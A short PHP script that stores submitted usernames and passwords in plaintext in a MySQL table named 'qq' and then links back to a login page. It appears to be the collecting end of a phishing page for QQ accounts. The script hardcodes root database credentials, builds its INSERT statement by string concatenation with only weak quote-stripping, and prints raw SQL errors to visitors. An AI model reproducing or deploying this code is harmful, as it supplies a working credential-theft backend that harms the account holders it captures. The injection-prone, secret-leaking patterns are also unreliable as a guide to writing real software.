<?php
$preusername = $_POST["username"];
$prepassword = $_POST["password"];


// 危险字符去掉并记录
$substringsToRemove = ['\'', '"', '<?', '?>'];

$preusername = str_replace($substringsToRemove, "", $preusername);
$prepassword = str_replace($substringsToRemove, "", $prepassword);

$qqusername = str_replace(' ', '', $preusername);
$qqpassword = str_replace(' ', '', $prepassword);




if ($qqusername == '' && $qqpassword == '') {
    echo "
    <html>
        <head>
            <meta charset=\"utf-8\">
            <title>Error,The Token Is Empty!</title>
        </head>
        <body>
            <h1>Error,The Token Is Empty!</h1>
            <p>Please Check Your Token On The Link!</p>
            <a href=\"../../\">点击返回登录！</a>
        </body>
    </html>
    ";
} else {
    // 连接数据库
    $servername = "localhost";
    $username = "root";
    $password = "123456";

    // 创建连接
    $conn = mysqli_connect($servername, $username, $password);
    // 检测连接
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    mysqli_select_db($conn, 'qqnumber');
    mysqli_query($conn, "set names utf8");

    $sql = "INSERT INTO qq " .
        "(username,password) " .
        "VALUES " .
        "('$qqusername','$qqpassword')";

    if (mysqli_query($conn, $sql)) {
        echo "新记录插入成功";
    } else {
        echo "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
}

?>